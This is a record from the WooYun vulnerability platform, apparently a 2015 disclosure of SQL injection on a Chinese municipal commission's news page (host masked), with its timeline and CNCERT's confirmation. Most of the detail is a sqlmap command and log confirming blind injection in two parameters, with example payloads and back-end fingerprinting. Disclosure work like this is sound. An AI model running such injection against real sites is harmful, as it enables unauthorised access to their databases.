{"id": 69581, "wybug_id": "wooyun-2015-0137315", "wybug_title": "淮安市经济和信息化委某页存在SQL注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "linkey", "wybug_date": "2015-08-30 23:46", "wybug_open_date": "2015-10-17 10:06", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-02：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-17：\t细节向公众公开  简要描述： RT 详细说明：  sqlmap:\npython sqlmap.py -u \"http://**.**.**.**/fwpt/shownews.asp?id=229&xxfl=3\" --table\n得出:\n[20:16:02] [INFO] testing connection to the target url[20:16:06] [INFO] testing if the url is stable, wait a few seconds[20:16:09] [WARNING] url is not stable, sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c[20:17:19] [INFO] testing if GET parameter 'id' is dynamic[20:17:20] [INFO] confirming that GET parameter 'id' is dynamic[20:17:20] [WARNING] GET parameter 'id' appears to be not dynamic[20:17:22] [WARNING] reflective value(s) found and filtering out[20:17:22] [INFO] heuristic test shows that GET parameter 'id' might be injectable (possible DBMS: Microsoft Access)[20:17:22] [INFO] testing for SQL injection on GET parameter 'id'[20:17:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[20:17:28] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable parsed error message(s) showed that the back-end DBMS could be Microsoft Access. Do you want to skip test payloads specific for other DBMSes? [Y/n] y[20:17:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[20:17:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other injection technique found[20:18:18] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[20:18:24] [INFO] testing if GET parameter 'xxfl' is dynamic[20:18:26] [INFO] confirming that GET parameter 'xxfl' is dynamic[20:18:26] [WARNING] GET parameter 'xxfl' appears to be not dynamic[20:18:26] [INFO] heuristic test shows that GET parameter 'xxfl' might be injectable (possible DBMS: Microsoft Access)[20:18:26] [INFO] testing for SQL injection on GET parameter 'xxfl'[20:18:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[20:18:29] [INFO] GET parameter 'xxfl' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [20:18:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 40 columns'[20:18:31] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[20:18:34] [INFO] target url appears to have 8 columns in queryinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[20:20:44] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. --dbms=mysql) [20:20:44] [INFO] checking if the injection point on GET parameter 'xxfl' is a false positiveGET parameter 'xxfl' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 80 HTTP(s) requests:\n结果成功（废话不成功会提交！！）\n---Place: GETParameter: xxfl    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=229&xxfl=3 AND 1291=1291Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=229 AND 4337=4337&xxfl=3---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: id, type: Unescaped numeric (default)[1] place: GET, parameter: xxfl, type: Unescaped numeric[q] Quit> 0[20:21:36] [INFO] testing Microsoft Access[20:21:37] [INFO] confirming Microsoft Access[20:21:38] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft Access[20:21:38] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[20:21:38] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 linkey@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-09-02 10:05 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}